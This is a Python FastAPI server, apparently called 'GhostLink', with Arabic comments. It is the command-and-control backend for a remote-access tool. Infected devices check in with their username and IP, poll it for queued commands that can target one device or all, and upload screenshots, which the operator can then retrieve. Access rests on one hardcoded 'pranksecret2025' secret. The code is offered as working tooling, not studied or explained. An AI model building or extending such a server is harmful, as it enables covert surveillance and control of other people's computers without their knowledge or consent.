from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from collections import deque
import time, base64

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

SECRET = "pranksecret2025"
pending = deque(maxlen=50)

# قاموس الأجهزة المتصلة
# { device_id: { "name": str, "ip": str, "last_seen": float, "screenshot": str } }
devices: dict = {}

class Command(BaseModel):
    secret: str
    action: str
    data: str = ""
    target: str = "all"  # device_id أو all

class HeartBeat(BaseModel):
    secret: str
    device_id: str
    username: str
    ip: str

class Screenshot(BaseModel):
    secret: str
    device_id: str
    image: str  # base64

def auth(s: str):
    if s != SECRET:
        raise HTTPException(403, "denied")

@app.get("/")
async def root():
    return {"status": "GhostLink online"}

@app.post("/heartbeat")
async def heartbeat(h: HeartBeat):
    auth(h.secret)
    devices[h.device_id] = {
        "name": h.username,
        "ip": h.ip,
        "last_seen": time.time()
    }
    if h.device_id not in [d.get("device_id") for d in list(pending)]:
        pass
    return {"ok": True}

@app.get("/devices")
async def get_devices(secret: str):
    auth(secret)
    now = time.time()
    online = {
        did: {**info, "online": (now - info["last_seen"]) < 15}
        for did, info in devices.items()
    }
    return online

@app.post("/send")
async def send_command(cmd: Command):
    auth(cmd.secret)
    pending.append({
        "action": cmd.action,
        "data": cmd.data,
        "target": cmd.target,
        "ts": time.time()
    })
    return {"ok": True}

@app.get("/poll")
async def poll(secret: str, device_id: str):
    auth(secret)
    for i, cmd in enumerate(list(pending)):
        if cmd["target"] == "all" or cmd["target"] == device_id:
            pending.remove(cmd)
            return cmd
    return {"action": "none", "data": ""}

@app.post("/screenshot")
async def upload_screenshot(s: Screenshot):
    auth(s.secret)
    if s.device_id in devices:
        devices[s.device_id]["screenshot"] = s.image
    return {"ok": True}

@app.get("/screenshot")
async def get_screenshot(secret: str, device_id: str):
    auth(secret)
    img = devices.get(device_id, {}).get("screenshot")
    return {"image": img}
